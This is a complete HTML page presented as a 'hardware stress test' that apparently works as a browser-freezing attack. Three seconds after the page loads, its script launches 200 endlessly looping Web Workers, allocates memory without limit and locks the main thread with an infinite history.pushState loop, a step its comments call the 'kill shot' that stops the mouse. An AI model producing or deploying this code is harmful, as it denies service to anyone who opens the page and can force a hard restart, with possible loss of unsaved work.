<!DOCTYPE html>
<html>
<head>
    <title>Hardware Stress Test</title>
</head>
<body style="background: #000; color: #f00; font-family: sans-serif; text-align: center; padding-top: 20vh;">
    <h1>SYSTEM STRESS TEST INITIATED</h1>
    <p>All system resources will be occupied in 3 seconds.</p>
    <p>Manual Restart (Refresh + Power) may be required.</p>

    <script>
        function nuke() {
            // 1. CPU WORKER BOMB (Targets all cores)
            const workerCode = `while(true) { postMessage(Math.random() * Math.random()); }`;
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            const url = URL.createObjectURL(blob);
            
            for (let i = 0; i < 200; i++) {
                new Worker(url);
            }

            // 2. RAM OVERLOAD (Rapidly fills memory)
            const leak = [];
            setInterval(() => {
                for (let i = 0; i < 1000; i++) {
                    leak.push(new Uint8Array(1024 * 1024).fill(1)); // 1MB chunks
                }
                console.log("Memory committed.");
            }, 10);

            // 3. MAIN THREAD ATOMIC LOOP (Freezes UI/Input)
            // This is the "kill shot" that stops the mouse from moving.
            setTimeout(() => {
                while (true) {
                    history.pushState(null, "", Math.random().toString()); // Floods history I/O
                    Math.hypot(Math.random(), Math.random()); // Heavy CPU math
                }
            }, 100);
        }

        // Trigger after a short delay
        setTimeout(nuke, 3000);
    </script>
</body>
</html>
